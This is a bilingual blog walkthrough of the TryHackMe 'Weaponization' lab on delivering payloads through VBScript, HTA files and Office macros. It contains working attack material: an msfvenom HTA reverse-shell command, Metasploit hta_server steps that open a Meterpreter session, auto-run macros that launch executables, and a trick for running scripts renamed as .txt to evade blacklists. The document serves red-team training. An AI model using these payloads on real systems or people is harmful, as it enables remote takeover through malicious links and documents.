---
title: TryHackMe-Weaponization
description: 'Red Teaming'
pubDate: 2024-04-02
image: /image/tryhackme.jpg
categories:
  - Documentation
tags:
  - Tryhackme
---

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712043244908-d4088579-c1c2-4a1b-8ef2-07f542932268.png)

**<font style="color:rgb(183, 189, 250);background-color:rgb(32, 35, 62);">大多数组织在其受控环境中阻止或监视.exe</font>**<font style="color:rgb(183, 189, 250);background-color:rgb(32, 35, 62);"> </font><font style="color:rgb(183, 189, 250);background-color:rgb(32, 35, 62);">文件的执行 。出于这个原因，红队依赖于使用其他技术来执行有效负载，例如内置的 Windows 脚本技术。因此，此任务侧重于各种流行且有效的脚本编写技术，包括:</font>

+ <font style="color:rgb(183, 189, 250);background-color:rgb(32, 35, 62);">Windows 脚本宿主 (WSH)</font>
+ <font style="color:rgb(183, 189, 250);background-color:rgb(32, 35, 62);">HTML 应用程序 (HTA)</font>
+ <font style="color:rgb(183, 189, 250);background-color:rgb(32, 35, 62);">Visual Basic 应用程序 (VBA)</font>
+ <font style="color:rgb(183, 189, 250);background-color:rgb(32, 35, 62);">电力外壳 (PSH)</font>

# <font style="color:rgb(21, 28, 43);">Windows 脚本主机 （WSH）</font>
<font style="color:rgb(21, 28, 43);">它是一个 Windows 本机引擎，cscript.exe（用于命令行脚本）和 wscript.exe（用于 UI 脚本），负责执行各种Microsoft Visual Basic 脚本 （VBScript），包括 vbs 和 vbe。有关 VBScript 的更多信息，请访问此处。需要注意的是，Windows 操作系统上的 VBScript 引擎以与普通用户相同的访问和权限级别运行和执行应用程序;因此，它对红队队员很有用。</font>

<font style="color:rgb(21, 28, 43);">现在，让我们编写一个简单的 VBScript 代码来创建一个显示“欢迎使用 THM”消息的 Windows 消息框。请确保将以下代码保存到文件中，例如 hello.vbs</font><font style="color:rgb(21, 28, 43);">.</font>

```plain
Dim message 
message = "Welcome to THM"
MsgBox message
```

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712019399220-fb904816-a8f4-49f6-98e4-ffb7e98667bc.png)

<font style="color:rgb(21, 28, 43);">现在，让我们使用 VBScript 来运行可执行文件。以下 vbs 代码用于调用 Windows 计算器，证明我们可以使用 Windows 本机引擎 （WSH） 执行.exe文件。</font>

```javascript
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

<font style="color:rgb(21, 28, 43);">我们使用 CreateObject 创建 WScript 库的对象来调用执行有效负载。然后，我们利用 Run 方法来执行有效负载。对于此任务，我们将运行 Windows calculatorcalc.exe。</font>

<font style="color:rgb(21, 28, 43);">要执行 vbs 文件，我们可以使用 wscript 运行它，如下所示：</font>

```plain
c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs
```

<font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);"> 我们也可以通过 cscript 运行它，如下所示：</font>

```plain
c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs
```

<font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">因此，Windows 计算器将显示在桌面上。</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712020495416-7c4d6c81-2e7d-4ec1-8a13-becf7a6983e9.png)

<font style="color:rgb(21, 28, 43);">另一个技巧。如果 VBS 文件被列入黑名单，那么我们可以将文件重命名为 .txt 文件并使用 wscript 运行它，如下所示：</font>

```plain
c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
```

<font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">结果将与执行运行calc.exe二进制文件的 vbs 文件一样精确。</font><font style="color:rgb(21, 28, 43);">  
</font>

# <font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);"> HTML 应用程序 （HTA）</font>
<font style="color:rgb(21, 28, 43);">HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered.</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">HTML Applications, also known as HTAs, which are dynamic </font><font style="color:rgb(235, 87, 87);">HTML</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool </font><font style="color:rgb(235, 87, 87);">mshta</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">is used to execute</font><font style="color:rgb(21, 28, 43);"> </font><u><font style="color:rgb(21, 28, 43);">HTA</font></u><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">files. It can be executed by itself or automatically from Internet Explorer. </font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">HTA 代表“HTML 应用程序”。它允许您创建一个可下载的文件，该文件包含有关其显示和呈现方式的所有信息。HTML 应用程序，也称为 HTA，它们是包含 JScript 和 VBScript 的动态 HTML 页面。LOLBINS（Living-of-the-land Binaries）工具mshta用于执行HTA文件。它可以自行执行，也可以从 Internet Explorer 自动执行。</font>

<font style="color:rgb(21, 28, 43);">In the following example, we will use an </font>[<font style="color:rgb(21, 28, 43);">ActiveXObject</font>](https://en.wikipedia.org/wiki/ActiveX)<font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">in our payload as proof of concept to execute </font><font style="color:rgb(235, 87, 87);">cmd.exe</font><font style="color:rgb(21, 28, 43);">. Consider the following HTML code.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">在下面的示例中，我们将使用有效负载中的 ActiveXObject 作为概念证明来执行cmd.exe。请考虑以下 HTML 代码。</font>

```plain
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

<font style="color:rgb(21, 28, 43);">Then serve the </font><font style="color:rgb(235, 87, 87);">payload.hta</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">from a web server, this could be done from the attacking machine as follows,</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">然后从 Web 服务器提供 payload.hta，这可以从攻击机器完成，如下所示：</font>

<font style="color:white;background-color:rgb(62, 69, 82);">Terminal</font><font style="color:white;background-color:rgb(62, 69, 82);"> </font><font style="color:white;background-color:rgb(62, 69, 82);">终端</font>



```plain
user@machine$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
```

<font style="color:rgb(21, 28, 43);">On the victim machine, visit the malicious link using Microsoft Edge, </font><font style="color:rgb(235, 87, 87);">http://10.8.232.37:8090/payload.hta</font><font style="color:rgb(21, 28, 43);">. Note that the </font><font style="color:rgb(235, 87, 87);">10.8.232.37</font><font style="color:rgb(21, 28, 43);"> is the AttackBox's IP address.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">在受害计算机上，使用 Microsoft Edge 访问恶意链接，http://10.8.232.37:8090/payload.hta。请注意，10.8.232.37 是 AttackBox 的 IP 地址。</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712020912859-c7b2967b-8499-40bc-a663-477f0ec79b66.png)

<font style="color:rgb(21, 28, 43);">Once we press </font><font style="color:rgb(235, 87, 87);">Run</font><font style="color:rgb(21, 28, 43);">,</font><font style="color:rgb(21, 28, 43);"> the </font><font style="color:rgb(235, 87, 87);">payload.hta</font><font style="color:rgb(21, 28, 43);"> gets executed</font><font style="color:rgb(21, 28, 43);">, and then it will invoke the </font><font style="color:rgb(235, 87, 87);">cmd.exe</font><font style="color:rgb(21, 28, 43);">. The following figure shows that we have successfully executed the </font><font style="color:rgb(235, 87, 87);">cmd.exe</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">一旦我们按下运行，payload.hta 就会被执行，然后它将调用cmd.exe。下图显示我们已经成功执行了cmd.exe</font><font style="color:rgb(21, 28, 43);">.</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712020912691-30452e00-e974-42df-822c-f3cc2ddc852d.png)

**<u><font style="color:rgb(21, 28, 43);">HTA</font></u>****<font style="color:rgb(21, 28, 43);"> </font>****<font style="color:rgb(21, 28, 43);">Reverse Connection</font>****<font style="color:rgb(21, 28, 43);"> </font>****<font style="color:rgb(21, 28, 43);">HTA 反向连接</font>**

<font style="color:rgb(21, 28, 43);">We can create a reverse shell payload as follows,</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">我们可以创建一个反向 shell 有效负载，如下所示：</font>

<font style="color:white;background-color:rgb(62, 69, 82);">Terminal</font><font style="color:white;background-color:rgb(62, 69, 82);"> </font><font style="color:white;background-color:rgb(62, 69, 82);">终端</font>

<font style="color:rgb(21, 28, 43);">We use the </font><font style="color:rgb(235, 87, 87);">msfvenom</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">from the </font><u><font style="color:rgb(235, 87, 87);">Metasploit</font></u><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">framework to generate a malicious payload to connect back to the attacking machine. We used the following payload to connect the </font><font style="color:rgb(235, 87, 87);">windows/x64/shell_reverse_tcp</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">to our IP and listening port.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">我们使用 Metasploitframework 中的 msfvenom 来生成恶意负载以连接回攻击机器。我们使用以下有效负载将 windows/x64/shell_reverse_tcp 连接到我们的 IP 和侦听端口。</font>

<font style="color:rgb(21, 28, 43);">On the attacking machine, we need to listen to the port </font><font style="color:rgb(235, 87, 87);">443</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">using </font><font style="color:rgb(235, 87, 87);">nc</font><font style="color:rgb(21, 28, 43);">. Please note this port needs root privileges to open, or you can use different ones.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">在攻击机器上，我们需要使用 nc 监听端口 443。请注意，此端口需要root权限才能打开，或者您可以使用其他权限。</font>

<font style="color:rgb(21, 28, 43);">Once the victim visits the malicious URL and hits run, we get the connection back.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">一旦受害者访问恶意 URL 并点击运行，我们就会恢复连接。</font>

<font style="color:white;background-color:rgb(62, 69, 82);">Terminal</font><font style="color:white;background-color:rgb(62, 69, 82);"> </font><font style="color:white;background-color:rgb(62, 69, 82);">终端</font>

<font style="color:rgb(21, 28, 43);">Malicious</font><font style="color:rgb(21, 28, 43);"> </font><u><font style="color:rgb(21, 28, 43);">HTA</font></u><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">via</font><font style="color:rgb(21, 28, 43);"> </font><u><font style="color:rgb(21, 28, 43);">Metasploit</font></u><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">通过 Metasploit 的恶意 HTA</font><font style="color:rgb(21, 28, 43);"> </font>

<font style="color:rgb(21, 28, 43);">There is another way to generate and serve malicious HTA files using the Metasploit framework. First, run the Metasploit framework using </font><font style="color:rgb(235, 87, 87);">msfconsole -q</font><font style="color:rgb(21, 28, 43);"> command. </font><font style="color:rgb(21, 28, 43);">Under the exploit section, there is </font><font style="color:rgb(235, 87, 87);">exploit/windows/misc/hta_server,</font><font style="color:rgb(21, 28, 43);"> which requires selecting and setting information such as </font><font style="color:rgb(235, 87, 87);">LHOST</font><font style="color:rgb(21, 28, 43);">, </font><font style="color:rgb(235, 87, 87);">LPORT</font><font style="color:rgb(21, 28, 43);">, </font><font style="color:rgb(235, 87, 87);">SRVHOST</font><font style="color:rgb(21, 28, 43);">, </font><font style="color:rgb(235, 87, 87);">Payload,</font><font style="color:rgb(21, 28, 43);"> and finally, executing </font><font style="color:rgb(235, 87, 87);">exploit</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">to run the module.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">还有另一种方法可以使用 Metasploit 框架生成和提供恶意 HTA 文件。首先，使用 msfconsole -q 命令运行 Metasploit 框架。在漏洞利用部分下，有 exploit/windows/misc/hta_server，它需要选择和设置 LHOST、LPORT、SRVHOST、Payload 等信息，最后执行 EXPLOIT 来运行模块。</font>

<font style="color:white;background-color:rgb(62, 69, 82);">Terminal</font><font style="color:white;background-color:rgb(62, 69, 82);"> </font><font style="color:white;background-color:rgb(62, 69, 82);">终端</font>

<font style="color:rgb(21, 28, 43);">On the victim machine, once we visit the malicious</font><font style="color:rgb(21, 28, 43);"> </font><u><font style="color:rgb(21, 28, 43);">HTA</font></u><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">file that was provided as a URL by</font><font style="color:rgb(21, 28, 43);"> </font><u><font style="color:rgb(21, 28, 43);">Metasploit</font></u><font style="color:rgb(21, 28, 43);">, we should receive a reverse connection.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">在受害机器上，一旦我们访问了Metasploit作为URL提供的恶意HTA文件，我们应该会收到一个反向连接。</font><font style="color:rgb(21, 28, 43);">  
</font>

<font style="color:white;background-color:rgb(62, 69, 82);">Terminal</font><font style="color:white;background-color:rgb(62, 69, 82);"> </font><font style="color:white;background-color:rgb(62, 69, 82);">终端</font>

```plain
user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of hta-psh file: 7692 bytes
Saved as: thm.hta
```

```plain
user@machine$ sudo nc -lvp 443
listening on [any] 443 ...
10.8.232.37: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.201.254] 52910
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads>
pState\Downloads>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 4:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::fce4:699e:b440:7ff3%2
   IPv4 Address. . . . . . . . . . . : 10.10.201.254
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1
```

```plain
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37
LHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set LPORT 443
LPORT => 443
msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37
SRVHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/misc/hta_server) >
[*] Started reverse TCP handler on 10.8.232.37:443
[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
[*] Server started.
```

```plain
user@machine$ [*] 10.10.201.254    hta_server - Delivering Payload
[*] Sending stage (175174 bytes) to 10.10.201.254
[*] Meterpreter session 1 opened (10.8.232.37:443 -> 10.10.201.254:61629) at 2021-11-16 06:15:46 -0600
msf6 exploit(windows/misc/hta_server) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : DESKTOP-1AU6NT4
OS              : Windows 10 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
meterpreter > shell
Process 4124 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\app>
```

<font style="color:rgb(235, 0, 55);">Answer the questions below</font><font style="color:rgb(235, 0, 55);">  
</font><font style="color:rgb(235, 0, 55);">回答以下问题</font>

<font style="color:rgb(21, 28, 43);">Now, apply what we discussed to receive a reverse connection using the user simulation machine in the Practice Arena task.  
</font><font style="color:rgb(21, 28, 43);">现在，应用我们讨论的内容，在 Practice Arena 任务中使用用户模拟机器接收反向连接。</font>

# <font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">Visual Basic 应用程序 （VBA）</font>
<font style="color:rgb(21, 28, 43);">VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications. </font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">VBA 代表 Visual Basic for Applications，这是 Microsoft 为 Microsoft 应用程序（如 Microsoft Word、Excel、PowerPoint 等）实现的一种编程语言。 VBA 编程允许自动执行用户与 Microsoft Office 应用程序之间几乎所有键盘和鼠标交互的任务。</font><font style="color:rgb(21, 28, 43);">  
</font>

<font style="color:rgb(21, 28, 43);">Macros are Microsoft Office applications that contain embedded code written in a programming language known as Visual Basic for Applications (VBA). It is used to create custom functions to speed up manual tasks by creating automated processes. </font><font style="color:rgb(21, 28, 43);">One of VBA's features is accessing the Windows Application Programming Interface (</font>[<font style="color:rgb(21, 28, 43);">API</font>](https://en.wikipedia.org/wiki/Windows_API)<font style="color:rgb(21, 28, 43);">)</font><font style="color:rgb(21, 28, 43);"> and other low-level functionality</font><font style="color:rgb(21, 28, 43);">. For more information about VBA, visit</font><font style="color:rgb(21, 28, 43);"> </font>[<font style="color:rgb(21, 28, 43);">here</font>](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications)<font style="color:rgb(21, 28, 43);">. </font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">宏是 Microsoft Office 应用程序，其中包含用称为 Visual Basic for Applications （VBA） 的编程语言编写的嵌入式代码。它用于创建自定义函数，通过创建自动化流程来加快手动任务。VBA 的功能之一是访问 Windows 应用程序编程接口 （API） 和其他低级功能。有关 VBA 的详细信息，请访问此处。</font>

<font style="color:rgb(21, 28, 43);">In this task, we will discuss the basics of VBA and the ways the adversary uses macros to create malicious Microsoft documents. To follow up along with the content of this task, make sure to deploy the attached Windows machine in Task 2. When it is ready, it will be available through in-browser access.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">在此任务中，我们将讨论 VBA 的基础知识以及攻击者使用宏创建恶意 Microsoft 文档的方式。若要跟进此任务的内容，请确保在任务 2 中部署连接的 Windows 计算机。准备就绪后，将通过浏览器内访问提供。</font>

<font style="color:rgb(21, 28, 43);">Now open Microsoft Word 2016 from the Start menu. Once it is opened, we close the product key window since we will use it within the seven-day trial period.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">现在从“开始”菜单打开Microsoft Word 2016。打开后，我们将关闭产品密钥窗口，因为我们将在 7 天的试用期内使用它。</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712041700642-d9cfa62d-a154-419a-afd0-c72101898bc1.png)<font style="color:rgb(21, 28, 43);">  
</font>

<font style="color:rgb(21, 28, 43);">Next, make sure to accept the Microsoft Office license agreement that shows after closing the product key window.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">接下来，请确保接受关闭产品密钥窗口后显示的 Microsoft Office 许可协议。</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712041700529-a8fce774-4f06-4b3c-be0d-a1b427154e97.png)

<font style="color:rgb(21, 28, 43);">Now create a new blank Microsoft document to create our first </font><font style="color:rgb(235, 87, 87);">macro</font><font style="color:rgb(21, 28, 43);">. The goal is to discuss the basics of the language and show how to run it when a Microsoft Word document gets opened. First, we need to open the Visual Basic Editor by selecting </font><font style="color:rgb(235, 87, 87);">view</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">→ </font><font style="color:rgb(235, 87, 87);">macros</font><font style="color:rgb(21, 28, 43);">. The Macros window shows to create our own macro within the document.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">现在创建一个新的空白 Microsoft 文档以创建我们的第一个宏。目标是讨论该语言的基础知识，并展示如何在打开 Microsoft Word 文档时运行它。首先，我们需要通过选择“视图”→宏来打开 Visual Basic 编辑器。将显示“宏”窗口，以在文档中创建我们自己的宏。</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712041700447-2bc00af7-070a-40a9-b9cd-df85ebd293b6.png)<font style="color:rgb(21, 28, 43);">  
</font>

<font style="color:rgb(21, 28, 43);">In the </font><font style="color:rgb(235, 87, 87);">Macro name</font><font style="color:rgb(21, 28, 43);"> section, we choose to name our macro as </font><u><font style="color:rgb(235, 87, 87);">THM</font></u><font style="color:rgb(21, 28, 43);">. Note that we need </font><font style="color:rgb(21, 28, 43);">to select from the </font><font style="color:rgb(235, 87, 87);">Macros in</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">list</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">Document1</font><font style="color:rgb(21, 28, 43);"> and finally select </font><font style="color:rgb(235, 87, 87);">create</font><font style="color:rgb(21, 28, 43);">. Next, the Microsoft Visual Basic for Application editor shows where we can write VBA code. Let's try to show a message box with the following message: </font><font style="color:rgb(235, 87, 87);">Welcome to Weaponization Room!</font><font style="color:rgb(21, 28, 43);">. We can do that using the </font><font style="color:rgb(235, 87, 87);">MsgBox</font><font style="color:rgb(21, 28, 43);"> function as follows:</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">在宏名称部分，我们选择将宏命名为 THM。请注意，我们需要从列表 Document1 中的宏中进行选择，最后选择创建。接下来，Microsoft Visual Basic应用程序编辑器显示了我们可以编写VBA代码的位置。让我们尝试显示一个消息框，其中包含以下消息：欢迎来到武器化室！我们可以使用 MsgBox 函数来做到这一点，如下所示：</font>

```javascript
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```

<font style="color:rgb(21, 28, 43);">Finally, run the macro by</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">F5</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">or</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">Run</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">→</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">Run Sub/UserForm</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">最后，按 F5 运行宏或运行 → 运行 Sub/UserForm</font><font style="color:rgb(21, 28, 43);">.</font>

<font style="color:rgb(21, 28, 43);">Now in order to execute the VBA code automatically once the document gets opened, we can use built-in functions such as </font><font style="color:rgb(235, 87, 87);">AutoOpen</font><font style="color:rgb(21, 28, 43);"> and </font><font style="color:rgb(235, 87, 87);">Document_open</font><font style="color:rgb(21, 28, 43);">. Note that we need to specify the function name that needs to be run once the document opens, which in our case, is the </font><u><font style="color:rgb(235, 87, 87);">THM</font></u><font style="color:rgb(21, 28, 43);"> function.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">现在，为了在打开文档后自动执行VBA代码，我们可以使用AutoOpen和Document_open等内置功能。请注意，我们需要指定文档打开后需要运行的函数名称，在我们的例子中，它是 THM 函数。</font>

```javascript
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```

<font style="color:rgb(21, 28, 43);">It is important to note that to make the macro work, we need to save it in Macro-Enabled format such as</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">.doc and</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">docm</font><font style="color:rgb(21, 28, 43);">. Now let's save the file as</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">Word 97-2003 Template</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">where the Macro is enabled by going to</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">File</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">→</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">save Document1</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">and save as type →</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">Word 97-2003 Document</font><font style="color:rgb(21, 28, 43);"> and finally,</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">save</font><font style="color:rgb(21, 28, 43);">.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">需要注意的是，要使宏正常工作，我们需要将其保存为启用宏的格式，例如 .doc 和 docm。现在，让我们将文件另存为 Word 97-2003 模板，通过转到“文件”→保存 Document1 并另存为 Word 97-2003 文档→类型，最后保存来启用宏。</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712041700867-c8fdf91b-d153-460c-97de-ed9edc21b95c.png)<font style="color:rgb(21, 28, 43);">  
</font>

<font style="color:rgb(21, 28, 43);">Let's close the Word document that we saved. </font><font style="color:rgb(21, 28, 43);">If we reopen the document file, Microsoft Word will show a security message indicating that</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">Macros have been disabled</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">and give us the option to enable it. Let's enable it and move forward to check out the result.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">让我们关闭我们保存的Word文档。如果我们重新打开文档文件，Microsoft Word将显示一条安全消息，指示宏已被禁用，并给我们启用它的选项。让我们启用它并继续查看结果。</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712041700704-d68e3f19-8c00-430a-81ac-fb3a07a10363.png)<font style="color:rgb(21, 28, 43);">  
</font>

<font style="color:rgb(21, 28, 43);">Once we allowed the </font><font style="color:rgb(235, 87, 87);">Enable Content</font><font style="color:rgb(21, 28, 43);">, our macro gets executed as shown,</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">一旦我们允许启用内容，我们的宏就会被执行，如下所示，</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712041702336-7d725dd9-8717-479b-ba75-f6f471af03ee.png)<font style="color:rgb(21, 28, 43);">  
</font>

<font style="color:rgb(21, 28, 43);">Now edit the word document and create a macro function that executes a</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">calc.exe</font><font style="color:rgb(21, 28, 43);"> or any executable file as proof of concept as follows,</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">现在编辑 word 文档并创建一个执行calc.exe或任何可执行文件的宏函数作为概念证明，如下所示：</font><font style="color:rgb(21, 28, 43);">  
</font>

```javascript
Sub PoC()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

<font style="color:rgb(21, 28, 43);">To explain the code in detail, with </font><font style="color:rgb(235, 87, 87);">Dim payload As String,</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">we declare</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">payload</font><font style="color:rgb(21, 28, 43);"> variable as a string using</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">Dim</font><font style="color:rgb(21, 28, 43);"> keyword. With </font><font style="color:rgb(235, 87, 87);">payload = "calc.exe"</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">we are specifying the payload name and finally with </font><font style="color:rgb(235, 87, 87);">CreateObject("Wscript.Shell").Run payload</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">we create a Windows Scripting Host (WSH) object and run the payload. Note that if you want to rename the function name, then you must include the function name in the </font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">AutoOpen()</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">and</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">Document_open()</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">functions too.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">为了详细解释代码，使用 Dim payload As String，我们使用 Dim 关键字将 payload 变量声明为字符串。使用 payload = “calc.exe”，我们指定有效负载名称，最后使用 CreateObject（“Wscript.Shell”）。运行有效负载 我们创建一个 Windows 脚本主机 （WSH） 对象并运行有效负载。请注意，如果要重命名函数名称，则还必须在 AutoOpen（） 和 Document_open（） 函数中包含函数名称。</font>

